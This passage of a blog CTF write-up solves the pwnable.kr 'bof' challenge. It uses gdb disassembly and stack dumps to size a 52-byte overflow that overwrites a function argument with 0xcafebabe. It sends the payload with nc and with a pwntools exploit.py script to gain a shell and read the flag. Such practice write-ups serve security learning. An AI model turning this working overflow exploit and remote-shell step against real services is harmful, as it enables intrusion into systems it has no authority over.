+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33</span>Breakpoint <span style="color:#f99b15">1</span>, <span style="color:#f99b15">0x56555632</span> <span style="color:#5bc4bf">in</span> func ()
+</code></pre></div><p>We set a breakpoint at the line 40 where our input is compared with the
+required value <code>0xcafebabe</code> and examine the stack after continuing.</p>
+<div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span>(gdb) disas func
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span>Dump of assembler code <span style="color:#815ba4">for</span> function func:
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span>   <span style="color:#f99b15">0x5655562c</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">0</span><span style="color:#5bc4bf">&gt;</span>: push   ebp
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span>   <span style="color:#f99b15">0x5655562d</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">1</span><span style="color:#5bc4bf">&gt;</span>: mov    ebp,esp
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span>   <span style="color:#f99b15">0x5655562f</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">3</span><span style="color:#5bc4bf">&gt;</span>: sub    esp,<span style="color:#f99b15">0x48</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span style="color:#5bc4bf">=&gt;</span> <span style="color:#f99b15">0x56555632</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">6</span><span style="color:#5bc4bf">&gt;</span>: mov    eax,gs:<span style="color:#f99b15">0x14</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span>   <span style="color:#f99b15">0x56555638</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">12</span><span style="color:#5bc4bf">&gt;</span>:  mov    DWORD PTR [ebp<span style="color:#5bc4bf">-</span><span style="color:#f99b15">0xc</span>],eax
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span>   <span style="color:#f99b15">0x5655563b</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">15</span><span style="color:#5bc4bf">&gt;</span>:  xor    eax,eax
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span>   <span style="color:#f99b15">0x5655563d</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">17</span><span style="color:#5bc4bf">&gt;</span>:  mov    DWORD PTR [esp],<span style="color:#f99b15">0x5655578c</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span>   <span style="color:#f99b15">0x56555644</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">24</span><span style="color:#5bc4bf">&gt;</span>:  call   <span style="color:#f99b15">0xf7e58890</span> <span style="color:#5bc4bf">&lt;</span>puts<span style="color:#5bc4bf">&gt;</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span>   <span style="color:#f99b15">0x56555649</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">29</span><span style="color:#5bc4bf">&gt;</span>:  lea    eax,[ebp<span style="color:#5bc4bf">-</span><span style="color:#f99b15">0x2c</span>]
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span>   <span style="color:#f99b15">0x5655564c</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">32</span><span style="color:#5bc4bf">&gt;</span>:  mov    DWORD PTR [esp],eax
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span>   <span style="color:#f99b15">0x5655564f</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">35</span><span style="color:#5bc4bf">&gt;</span>:  call   <span style="color:#f99b15">0xf7e57fc0</span> <span style="color:#5bc4bf">&lt;</span>gets<span style="color:#5bc4bf">&gt;</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span>   <span style="color:#f99b15">0x56555654</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">40</span><span style="color:#5bc4bf">&gt;</span>:  cmp    DWORD PTR [ebp<span style="color:#5bc4bf">+</span><span style="color:#f99b15">0x8</span>],<span style="color:#f99b15">0xcafebabe</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span>   <span style="color:#f99b15">0x5655565b</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">47</span><span style="color:#5bc4bf">&gt;</span>:  jne    <span style="color:#f99b15">0x5655566b</span> <span style="color:#5bc4bf">&lt;</span>func<span style="color:#5bc4bf">+</span><span style="color:#f99b15">63</span><span style="color:#5bc4bf">&gt;</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span>   <span style="color:#f99b15">0x5655565d</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">49</span><span style="color:#5bc4bf">&gt;</span>:  mov    DWORD PTR [esp],<span style="color:#f99b15">0x5655579b</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span>   <span style="color:#f99b15">0x56555664</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">56</span><span style="color:#5bc4bf">&gt;</span>:  call   <span style="color:#f99b15">0xf7e33850</span> <span style="color:#5bc4bf">&lt;</span>system<span style="color:#5bc4bf">&gt;</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span>   <span style="color:#f99b15">0x56555669</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">61</span><span style="color:#5bc4bf">&gt;</span>:  jmp    <span style="color:#f99b15">0x56555677</span> <span style="color:#5bc4bf">&lt;</span>func<span style="color:#5bc4bf">+</span><span style="color:#f99b15">75</span><span style="color:#5bc4bf">&gt;</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span>   <span style="color:#f99b15">0x5655566b</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">63</span><span style="color:#5bc4bf">&gt;</span>:  mov    DWORD PTR [esp],<span style="color:#f99b15">0x565557a3</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span>   <span style="color:#f99b15">0x56555672</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">70</span><span style="color:#5bc4bf">&gt;</span>:  call   <span style="color:#f99b15">0xf7e58890</span> <span style="color:#5bc4bf">&lt;</span>puts<span style="color:#5bc4bf">&gt;</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span>   <span style="color:#f99b15">0x56555677</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">75</span><span style="color:#5bc4bf">&gt;</span>:  mov    eax,DWORD PTR [ebp<span style="color:#5bc4bf">-</span><span style="color:#f99b15">0xc</span>]
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span>   <span style="color:#f99b15">0x5655567a</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">78</span><span style="color:#5bc4bf">&gt;</span>:  xor    eax,DWORD PTR gs:<span style="color:#f99b15">0x14</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23</span>   <span style="color:#f99b15">0x56555681</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">85</span><span style="color:#5bc4bf">&gt;</span>:  je     <span style="color:#f99b15">0x56555688</span> <span style="color:#5bc4bf">&lt;</span>func<span style="color:#5bc4bf">+</span><span style="color:#f99b15">92</span><span style="color:#5bc4bf">&gt;</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24</span>   <span style="color:#f99b15">0x56555683</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">87</span><span style="color:#5bc4bf">&gt;</span>:  call   <span style="color:#f99b15">0xf7ef16c0</span> <span style="color:#5bc4bf">&lt;</span>__stack_chk_fail<span style="color:#5bc4bf">&gt;</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25</span>   <span style="color:#f99b15">0x56555688</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">92</span><span style="color:#5bc4bf">&gt;</span>:  leave  
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26</span>   <span style="color:#f99b15">0x56555689</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">93</span><span style="color:#5bc4bf">&gt;</span>:  ret    
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27</span>End of assembler dump<span style="color:#5bc4bf">.</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28</span>(gdb) b <span style="color:#5bc4bf">*</span><span style="color:#f99b15">0x56555654</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29</span>Breakpoint <span style="color:#f99b15">2</span> at <span style="color:#f99b15">0x56555654</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30</span>(gdb) c
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31</span>Continuing<span style="color:#5bc4bf">.</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32</span>overflow me : 
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34</span>Breakpoint <span style="color:#f99b15">2</span>, <span style="color:#f99b15">0x56555654</span> <span style="color:#5bc4bf">in</span> func ()
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35</span>(gdb) x<span style="color:#5bc4bf">/</span><span style="color:#f99b15">50</span>x <span style="color:#ef6155">$</span>esp
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36</span><span style="color:#f99b15">0xffffd0e0</span>: <span style="color:#f99b15">0xffffd0fc</span>  <span style="color:#f99b15">0xffffd184</span>  <span style="color:#f99b15">0xf7fad000</span>  <span style="color:#f99b15">0x0000000d</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37</span><span style="color:#f99b15">0xffffd0f0</span>: <span style="color:#f99b15">0xffffffff</span>  <span style="color:#f99b15">0xf7fad000</span>  <span style="color:#f99b15">0xf7e05e18</span>  <span style="color:#f99b15">0x41414141</span> <span style="color:#5bc4bf">&lt;==</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38</span><span style="color:#f99b15">0xffffd100</span>: <span style="color:#f99b15">0x41414141</span>  <span style="color:#f99b15">0x41414141</span>  <span style="color:#f99b15">0x41414141</span>  <span style="color:#f99b15">0x41414141</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39</span><span style="color:#f99b15">0xffffd110</span>: <span style="color:#f99b15">0x41414141</span>  <span style="color:#f99b15">0x41414141</span>  <span style="color:#f99b15">0x41414141</span>  <span style="color:#f99b15">0x14404000</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40</span><span style="color:#f99b15">0xffffd120</span>: <span style="color:#f99b15">0x00000001</span>  <span style="color:#f99b15">0xf7fad000</span>  <span style="color:#f99b15">0xffffd148</span>  <span style="color:#f99b15">0x5655569f</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41</span><span style="color:#f99b15">0xffffd130</span>: <span style="color:#f99b15">0xdeadbeef</span>  <span style="color:#f99b15">0x56555250</span>  <span style="color:#f99b15">0x565556b9</span>  <span style="color:#f99b15">0x00000000</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42</span><span style="color:#f99b15">0xffffd140</span>: <span style="color:#f99b15">0x00000001</span>  <span style="color:#f99b15">0xf7fad000</span>  <span style="color:#f99b15">0x00000000</span>  <span style="color:#f99b15">0xf7e11286</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43</span><span style="color:#f99b15">0xffffd150</span>: <span style="color:#f99b15">0x00000001</span>  <span style="color:#f99b15">0xffffd1e4</span>  <span style="color:#f99b15">0xffffd1ec</span>  <span style="color:#f99b15">0x00000000</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44</span><span style="color:#f99b15">0xffffd160</span>: <span style="color:#f99b15">0x00000000</span>  <span style="color:#f99b15">0x00000000</span>  <span style="color:#f99b15">0xf7fad000</span>  <span style="color:#f99b15">0xf7ffdc0c</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45</span><span style="color:#f99b15">0xffffd170</span>: <span style="color:#f99b15">0xf7ffd000</span>  <span style="color:#f99b15">0x00000000</span>  <span style="color:#f99b15">0x00000001</span>  <span style="color:#f99b15">0xf7fad000</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46</span><span style="color:#f99b15">0xffffd180</span>: <span style="color:#f99b15">0x00000000</span>  <span style="color:#f99b15">0x0826aef6</span>  <span style="color:#f99b15">0x35a082e6</span>  <span style="color:#f99b15">0x00000000</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47</span><span style="color:#f99b15">0xffffd190</span>: <span style="color:#f99b15">0x00000000</span>  <span style="color:#f99b15">0x00000000</span>  <span style="color:#f99b15">0x00000001</span>  <span style="color:#f99b15">0x56555530</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48</span><span style="color:#f99b15">0xffffd1a0</span>: <span style="color:#f99b15">0x00000000</span>  <span style="color:#f99b15">0xf7fee5f0</span>
+</code></pre></div><p>Examining the stack, we observe that our input is stored starting from the
+address <code>0xffffd0fc</code> and the function argument <code>0xdeadbeef</code> is stored at
+address <code>0xffffd130</code>, which we need to override with <code>0xcafebabe</code></p>
+<p>We need to figure out the length of our padding in order to overwrite the value
+at address <code>0xffffd130</code>. We can find this easily in python , subtractin the
+addresses</p>
+<div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span style="color:#5bc4bf">&gt;&gt;&gt;</span> <span style="color:#f99b15">0xffffd130</span><span style="color:#5bc4bf">-</span><span style="color:#f99b15">0xffffd0fc</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span style="color:#f99b15">52</span>
+</code></pre></div><p>So, we need a padding of size 52, and then we insert the required value in
+reverse order to overwrite the argument.</p>
+<p>Now, we create our new payload and run the program again</p>
+<div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span style="color:#ef6155">$python</span> -c <span style="color:#48b685">&#34;print(&#39;A&#39;*52 + &#39;\xbe\xba\xfe\xca&#39;)&#34;</span> &gt; payload
+</code></pre></div><div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span>(gdb) x<span style="color:#5bc4bf">/</span><span style="color:#f99b15">50</span>x <span style="color:#ef6155">$</span>esp
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span style="color:#f99b15">0xffffd0e0</span>: <span style="color:#f99b15">0xffffd0fc</span>  <span style="color:#f99b15">0xffffd184</span>  <span style="color:#f99b15">0xf7fad000</span>  <span style="color:#f99b15">0x0000000d</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span style="color:#f99b15">0xffffd0f0</span>: <span style="color:#f99b15">0xffffffff</span>  <span style="color:#f99b15">0xf7fad000</span>  <span style="color:#f99b15">0xf7e05e18</span>  <span style="color:#f99b15">0x41414141</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span style="color:#f99b15">0xffffd100</span>: <span style="color:#f99b15">0x41414141</span>  <span style="color:#f99b15">0x41414141</span>  <span style="color:#f99b15">0x41414141</span>  <span style="color:#f99b15">0x41414141</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span style="color:#f99b15">0xffffd110</span>: <span style="color:#f99b15">0x41414141</span>  <span style="color:#f99b15">0x41414141</span>  <span style="color:#f99b15">0x41414141</span>  <span style="color:#f99b15">0x41414141</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span style="color:#f99b15">0xffffd120</span>: <span style="color:#f99b15">0x41414141</span>  <span style="color:#f99b15">0x41414141</span>  <span style="color:#f99b15">0x41414141</span>  <span style="color:#f99b15">0x41414141</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span style="color:#f99b15">0xffffd130</span>: <span style="color:#f99b15">0xcafebabe</span>  <span style="color:#f99b15">0x56555200</span>  <span style="color:#f99b15">0x565556b9</span>  <span style="color:#f99b15">0x00000000</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span style="color:#f99b15">0xffffd140</span>: <span style="color:#f99b15">0x00000001</span>  <span style="color:#f99b15">0xf7fad000</span>  <span style="color:#f99b15">0x00000000</span>  <span style="color:#f99b15">0xf7e11286</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span style="color:#f99b15">0xffffd150</span>: <span style="color:#f99b15">0x00000001</span>  <span style="color:#f99b15">0xffffd1e4</span>  <span style="color:#f99b15">0xffffd1ec</span>  <span style="color:#f99b15">0x00000000</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span style="color:#f99b15">0xffffd160</span>: <span style="color:#f99b15">0x00000000</span>  <span style="color:#f99b15">0x00000000</span>  <span style="color:#f99b15">0xf7fad000</span>  <span style="color:#f99b15">0xf7ffdc0c</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span style="color:#f99b15">0xffffd170</span>: <span style="color:#f99b15">0xf7ffd000</span>  <span style="color:#f99b15">0x00000000</span>  <span style="color:#f99b15">0x00000001</span>  <span style="color:#f99b15">0xf7fad000</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span style="color:#f99b15">0xffffd180</span>: <span style="color:#f99b15">0x00000000</span>  <span style="color:#f99b15">0xf1272840</span>  <span style="color:#f99b15">0xcca10450</span>  <span style="color:#f99b15">0x00000000</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span style="color:#f99b15">0xffffd190</span>: <span style="color:#f99b15">0x00000000</span>  <span style="color:#f99b15">0x00000000</span>  <span style="color:#f99b15">0x00000001</span>  <span style="color:#f99b15">0x56555530</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span style="color:#f99b15">0xffffd1a0</span>: <span style="color:#f99b15">0x00000000</span>  <span style="color:#f99b15">0xf7fee5f0</span>
+</code></pre></div><p>Examinng the stack, we see that we have correctly overwritten the value at
+<code>0xffffd130</code> with our desired value <code>0xcafebabe</code>.</p>
+<p>Now we supply our payload to the program running on the server</p>
+<div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span style="color:#815ba4">$(</span>cat payload; cat<span style="color:#815ba4">)</span> | nc pwnable.kr <span style="color:#f99b15">9000</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span>whoami
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span>bof
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span>ls
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span>bof
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span>bof.c
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span>flag
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span>log
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span>log2
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span>super.pl
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span>cat flag
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span>daddy, I just pwned a buFFer :<span style="color:#5bc4bf">)</span>
+</code></pre></div><p>We see that we got a shell on the server. We use cat to hold the shell. We can
+now easily cat the flag!</p>
+<p>We can use a simple python script to get the flag for us:</p>
+<div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span style="color:#776e71">#! /usr/bin/python2</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span style="color:#776e71"># exploit.py</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span style="color:#5bc4bf">from</span> <span style="color:#fec418">pwn</span> <span style="color:#5bc4bf">import</span> <span style="color:#5bc4bf">*</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span>payload <span style="color:#5bc4bf">=</span> <span style="color:#48b685">&#39;A&#39;</span><span style="color:#5bc4bf">*</span><span style="color:#f99b15">52</span> <span style="color:#5bc4bf">+</span> <span style="color:#48b685">&#39;</span><span style="color:#f99b15">\xbe\xba\xfe\xca</span><span style="color:#48b685">&#39;</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span>shell <span style="color:#5bc4bf">=</span> remote(<span style="color:#48b685">&#39;pwnable.kr&#39;</span>, <span style="color:#f99b15">9000</span>)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span>shell<span style="color:#5bc4bf">.</span>send(payload)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span>shell<span style="color:#5bc4bf">.</span>interactive()
+</code></pre></div><div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span>$./exploit.py 
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span style="color:#5bc4bf">[</span>+<span style="color:#5bc4bf">]</span> Opening connection to pwnable.kr on port 9000: Done
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span style="color:#5bc4bf">[</span>*<span style="color:#5bc4bf">]</span> Switching to interactive mode
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span>$ ls
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span>$ ls
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span>bof
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span>bof.c
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span>flag
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span>log
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span>log2
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span>super.pl
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span>$ cat flag
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span>daddy, I just pwned a buFFer :<span style="color:#5bc4bf">)</span>
+</code></pre></div><p>FLAG: daddy, I just pwned a buFFer :)</p>
+
+    </div>
+    <div class="article-footer">
+<blockquote class="mt-2x">
+  <ul class="post-copyright list-unstyled">
+    <li class="post-copyright-link hidden-xs">
+      <strong>Permalink: </strong>
+      <a href="/writeups/ctf_writeups/pwnable.kr/toddlers-bottle/pwnable.kr-bof-writeup/" title="pwnable.kr - bof writeup" target="_blank" rel="external">/writeups/ctf_writeups/pwnable.kr/toddlers-bottle/pwnable.kr-bof-writeup/</a>
+    </li>
+    <li class="post-copyright-license">
+      <strong>License：</strong><a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN</a>
+    </li>
+  </ul>
+</blockquote>
+
+<div class="panel panel-default panel-badger">
+  <div class="panel-body">
+    <figure class="media">
+      <div class="media-left">
+        <a href="https://github.com/fmash16" target="_blank" class="img-burn thumb-sm visible-lg">
+          <img src="/avatar.png" class="img-rounded w-full" alt="">
+        </a>
+      </div>
+      <div class="media-body">
+        <h3 class="media-heading"><a href="https://github.com/fmash16" target="_blank"><span class="text-dark">fmash16</span></a></h3>
+        <div>Hack the Planet</div>
+      </div>
+    </figure>
+  </div>
+</div>
+
+    </div>
+  </article>
+<section id="comments">
+</section>
+
+</div><nav class="bar bar-footer clearfix" data-stick-bottom>
+    <div class="bar-inner">
+        <ul class="pager pull-left">
+            <li class="prev">
+                <a href="/writeups/ctf_writeups/pwnable.kr/toddlers-bottle/pwnable.kr-collision-writeup/" title="pwnable.kr - collision writeup"><i
+                        class="icon icon-angle-left"
+                        aria-hidden="true"></i><span>&nbsp;&nbsp;Older</span></a>
+            </li>
+            <li class="next">
+                <a href="/writeups/ctf_writeups/neverlan_ctf/reverse-engineering/neverlan-ctf-reverse-engineer-writeup/"
+                    title="NeverLAN CTF - Reverse Engineer writeup"><span>Newer&nbsp;&nbsp;</span><i
+                        class="icon icon-angle-right" aria-hidden="true"></i></a>
+            </li>
+            
+            <li class="toggle-toc">
+                <a class="toggle-btn collapsed" data-toggle="collapse" href="#collapseToc" aria-expanded="false"
+                    title="Catalogue" role="button">
+                    <span>[&nbsp;</span><span>Index</span>
+                    <i class="text-collapsed icon icon-anchor"></i>
+                    <i class="text-in icon icon-close"></i>
+                    <span>]</span>
+                </a>
+            </li>
+        </ul>
+        <div class="bar-right">
+            <div class="share-component" data-sites="facebook,twitter"
+                data-mobile-sites="">Share on:</div>
+        </div>
+    </div>
+</nav>
+
+
+
+</main><footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
+<ul class="social-links">
+    <li><a href="https://github.com/fmash16" target="_blank" title="github" data-toggle=tooltip data-placement=top >
+            <i class="icon icon-github"></i></a></li>
+    <li><a href="/index.xml" target="_blank" title="rss" data-toggle=tooltip data-placement=top >
+            <i class="icon icon-rss"></i></a></li>
+    <li><a href="https://twitter.com/fmash16" target="_blank" title="twitter" data-toggle=tooltip data-placement=top >
+            <i class="icon icon-twitter"></i></a></li>
+</ul>
+  <div class="copyright">
+    &copy;2020  -
+    2020
+    
+    
+    </div>
+  </div>
+</footer>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_SVG"></script>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+            showMathMenu: false, //disables context menu
+            tex2jax: {
+            inlineMath: [ ['$','$'], ['\\(','\\)'] ]
+           }
+    });
+</script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script>
+<script>
+    window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
+</script>
+<script type="text/javascript" src="https://cdn.staticfile.org/highlight.js/9.15.10/highlight.min.js"></script><script>
+    hljs.configure({
+        tabReplace: '    ', 
+        classPrefix: ''     
+        
+    })
+    hljs.initHighlightingOnLoad();
+</script>
+<script src="/js/application.min.bdeb64b910570b6c41badc6a05b7afb0c8ad9efd8525de3c7257d59e786326a3.js"></script>
